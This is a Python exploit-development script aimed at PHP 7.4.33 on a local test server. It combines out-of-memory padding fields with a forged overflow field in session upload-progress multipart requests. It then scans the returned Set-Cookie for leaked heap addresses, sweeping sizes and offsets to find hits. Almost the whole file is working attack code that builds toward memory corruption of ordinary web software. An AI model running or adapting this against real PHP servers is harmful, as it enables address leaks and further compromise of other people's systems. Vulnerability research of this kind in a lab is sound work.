"""On 7.4.33: combine OOM (accumulated 1.8MB fields) WITH forge overflow in the SAME request.
Hypothesis: the stage-1 leak needs BOTH (a) OOM to leave PS(id) in a state the Set-Cookie
reads corrupted, and (b) forge to overflow into it. 8.4.26 does both in one request.
Try: many 1.8MB fields + forge field + SID + progress, all in ONE request."""
import sys, os, time, struct, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"

def fire_combo(n_mb, forge_size, forged_len_off, forged_val=0x1000):
    t = E.Target(URL, timeout=120.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    # n_mb fields of 1.8MB to force OOM
    for i in range(n_mb):
        parts.append({"name": f"m{i:04d}", "data": b"M" * int(1.8 * 1024 * 1024)})
    # forge field
    forge = bytearray(b"F" * forge_size)
    if forged_len_off + 8 <= forge_size:
        struct.pack_into("<Q", forge, forged_len_off, forged_val)
    if forged_len_off + 8 < forge_size:
        forge[forged_len_off + 8] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=120.0)
    except Exception as e:
        return None, 0, 0
    raw = E.parse_cookie(resp)
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    best = max(c.values()) if c else 0
    oom = b"Fatal" in resp or b"Allowed" in resp
    return oom, len(raw), best

print("=== 7.4.33 OOM + forge combo ===", flush=True)
for n_mb in [4, 6, 8]:
    for forge_size in [48, 79, 128]:
        for foff in [0x10, 0x18]:
            oom, clen, best = fire_combo(n_mb, forge_size, foff)
            mark = "  <<< HIT" if best >= 8 else ""
            print(f"n_mb={n_mb} forge={forge_size}B foff=0x{foff:x}: oom={oom} cookie={clen}B heapmax={best}{mark}", flush=True)
            time.sleep(0.3)
